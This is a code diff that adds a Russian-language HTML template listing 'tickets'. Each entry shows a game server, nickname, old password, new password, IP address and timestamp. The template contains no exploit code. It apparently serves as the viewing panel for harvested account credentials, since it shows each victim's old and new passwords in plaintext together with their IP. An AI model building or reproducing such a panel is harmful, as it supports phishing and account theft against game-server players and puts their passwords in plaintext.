@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Заявки</title>
+<style>
+  body { background:#0e1621; color:#e8e8e8; font-family: sans-serif; margin:0; padding:20px; }
+  .wrap { max-width:640px; margin:0 auto; }
+  h1 { font-size:20px; }
+  .card { background:#17212b; border-radius:10px; padding:14px; margin-top:12px;
+          font-size:14px; line-height:1.6; }
+  .k { color:#8aa0b3; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Заявки: {{ count }}</h1>
+  {% for t in tickets %}
+    <div class="card">
+      <div><span class="k">Сервер:</span> {{ t.server }}</div>
+      <div><span class="k">Ник:</span> {{ t.nick }}</div>
+      <div><span class="k">Старый пароль:</span> {{ t.old_password }}</div>
+      <div><span class="k">Новый пароль:</span> {{ t.new_password }}</div>
+      <div><span class="k">IP:</span> {{ t.ip }}</div>
+      <div><span class="k">Время:</span> {{ t.time }}</div>
+    </div>
+  {% else %}
+    <p>Пусто.</p>
+  {% endfor %}
+</div>
+</body>
+</html>
